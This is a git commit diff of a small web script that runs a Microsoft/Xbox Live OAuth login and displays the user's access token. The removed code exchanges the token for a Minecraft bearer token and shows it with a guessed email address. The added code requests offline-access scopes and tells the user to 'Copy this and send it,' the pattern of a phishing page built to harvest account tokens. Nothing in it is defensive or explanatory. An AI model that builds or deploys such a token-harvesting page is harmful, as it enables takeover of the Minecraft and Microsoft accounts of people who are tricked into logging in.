25262cec545d6abfdc96ee8cd59aa8cbd4915c02
Vortex7171 <sebtowse71@outlook.com>
2025-04-13 18:09:08 +1200

    Update script.js

--- script.js
+++ script.js
@@ -1,62 +1,20 @@
-const CLIENT_ID = "00000000402b5328"; // This is Minecraft's public Xbox Live client ID
-const REDIRECT_URI = location.origin + location.pathname;
+const CLIENT_ID = "d663097d-dd66-4c2e-9325-7091ea40c0fd";
+const REDIRECT_URI = window.location.origin + window.location.pathname;
+const SCOPES = "XboxLive.signin offline_access";
 
 function login() {
-  const url = `https://login.live.com/oauth20_authorize.srf?client_id=${CLIENT_ID}&response_type=token&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&scope=XboxLive.signin offline_access`;
-  window.location.href = url;
+    const authUrl = `https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_id=${CLIENT_ID}&response_type=token&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&scope=${encodeURIComponent(SCOPES)}`;
+    window.location.href = authUrl;
 }
 
-window.onload = async () => {
-  const hash = new URLSearchParams(location.hash.slice(1));
-  const accessToken = hash.get("access_token");
+// On redirect back, get token from URL
+window.onload = () => {
+    if (window.location.hash) {
+        const params = new URLSearchParams(window.location.hash.slice(1));
+        const token = params.get("access_token");
 
-  if (!accessToken) return;
-
-  const xblResp = await fetch("https://user.auth.xboxlive.com/user/authenticate", {
-    method: "POST",
-    headers: { "Content-Type": "application/json", Accept: "application/json" },
-    body: JSON.stringify({
-      Properties: {
-        AuthMethod: "RPS",
-        SiteName: "user.auth.xboxlive.com",
-        RpsTicket: `d=${accessToken}`
-      },
-      RelyingParty: "http://auth.xboxlive.com",
-      TokenType: "JWT"
-    })
-  });
-
-  const xbl = await xblResp.json();
-  const xstsResp = await fetch("https://xsts.auth.xboxlive.com/xsts/authorize", {
-    method: "POST",
-    headers: { "Content-Type": "application/json", Accept: "application/json" },
-    body: JSON.stringify({
-      Properties: {
-        SandboxId: "RETAIL",
-        UserTokens: [xbl.Token]
-      },
-      RelyingParty: "rp://api.minecraftservices.com/",
-      TokenType: "JWT"
-    })
-  });
-
-  const xsts = await xstsResp.json();
-
-  const mcResp = await fetch("https://api.minecraftservices.com/authentication/login_with_xbox", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      identityToken: `XBL3.0 x=${xsts.DisplayClaims.xui[0].uhs};${xsts.Token}`
-    })
-  });
-
-  const mc = await mcResp.json();
-  const profileResp = await fetch("https://api.minecraftservices.com/minecraft/profile", {
-    headers: { Authorization: `Bearer ${mc.access_token}` }
-  });
-
-  const profile = await profileResp.json();
-
-  document.getElementById("output").innerText =
-    `Email: ${xsts.DisplayClaims.xui[0].xid}@hotmail.com\nToken: ${mc.access_token}`;
+        if (token) {
+            document.getElementById("output").innerText = `Token:\n${token}\n\nCopy this and send it.`;
+        }
+    }
 };
